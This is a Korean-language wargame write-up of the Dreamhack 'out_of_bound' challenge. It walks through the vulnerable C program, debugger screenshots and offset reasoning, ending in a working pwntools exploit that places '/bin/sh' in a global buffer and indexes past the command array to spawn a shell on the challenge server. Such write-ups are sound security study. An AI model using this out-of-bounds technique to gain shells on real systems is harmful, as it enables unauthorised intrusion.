# Exploit Tech: Out of bounds  

### **Enviroment**  

```
Ubuntu 16.04
Arch:     i386-32-little
RELRO:    Partial RELRO
Stack:    Canary found
NX:       NX enabled
PIE:      No PIE (0x8048000)
```

### **코드 분석**

```c
#include <stdio.h>
#include <stdlib.h>
#include <signal.h>
#include <unistd.h>
#include <string.h>

char name[16];

char *command[10] = { "cat",
    "ls",
    "id",
    "ps",
    "file ./oob" };
void alarm_handler()
{
    puts("TIME OUT");
    exit(-1);
}

void initialize()
{
    setvbuf(stdin, NULL, _IONBF, 0);
    setvbuf(stdout, NULL, _IONBF, 0);

    signal(SIGALRM, alarm_handler);
    alarm(30);
}

int main()
{
    int idx;

    initialize();

    printf("Admin name: ");
    read(0, name, sizeof(name));
    printf("What do you want?: ");

    scanf("%d", &idx);

    system(command[idx]);

    return 0;
}

```

코드를 쭉 읽어보니  
`scanf("%d", &idx);`   
`system(command[idx])`   
여기에 입력 검증이 없다는 것을 알 수 있다.  

그러면 위에 `name` 에 `/bin/sh`를 치고 그 부분을 읽게 하면 될거같다  

<br>


![image](https://github.com/user-attachments/assets/3bd4724f-453b-4c12-80ee-96d796f84d5d)

![image](https://github.com/user-attachments/assets/bf555aaf-c6ff-41db-a3c9-52f72d78de3a)

`Admin name`을 입력 받는 곳에 브레이크를 걸고,  
어디에 저장되는지 봐두자.  파이가 꺼져있으니 항상 같은 주소에 있다.    

<br>

0x804a0ac 에 저장된다는 것을 알았으니 이제 command 의 베이스 주소를 찾아보면  
![image](https://github.com/user-attachments/assets/a58e859e-d136-4c24-8a0e-15da40104db7)

![image](https://github.com/user-attachments/assets/cd2ecb42-cc6d-4ab3-b463-e666123cdfd3)

<img src="https://github.com/user-attachments/assets/21eae627-3d4d-4f7c-985b-6791fe527ed4" width=500>



0x804a060에 command의 베이스 주소가 있다는 것을 알 수 있다.  

<br>

![image](https://github.com/user-attachments/assets/6a016334-a8f7-47a6-b6b5-d41bc4187355)

이걸로 76바이트 떨어진, command[19] 를 보면 되겠다.

그래서  `/bin/sh`를 넣고 `idx=19`를 해보면,

<br>

![image](https://github.com/user-attachments/assets/31377472-44f0-4c06-be1f-1ea4257625cd)


제대로 안들어가진다. 

4바이트만 들어갈 수 있으니 중간에 잘리게 된다. 

그러니 system(0x804a0ac) 으로 주소 안에 "/bin/sh\x00" 값을 모두 읽을 수 있게 해주자

command 베이스주소랑 76 + 8바이트가 차이나면 되니까 idx=21 을 해주면 된다

**익스플로잇 코드**

```c
from pwn import *

p = remote("host3.dreamhack.games", 9314)
#p = process('./out_of_bound')

payload = b"/bin/sh\x00" + p32(0x804a0ac)

p.sendline(payload)
p.sendline(b"21")

p.interactive()
```

![image](https://github.com/user-attachments/assets/b9be86cb-6796-42b7-9ac2-16804ad4737c)

성공이다
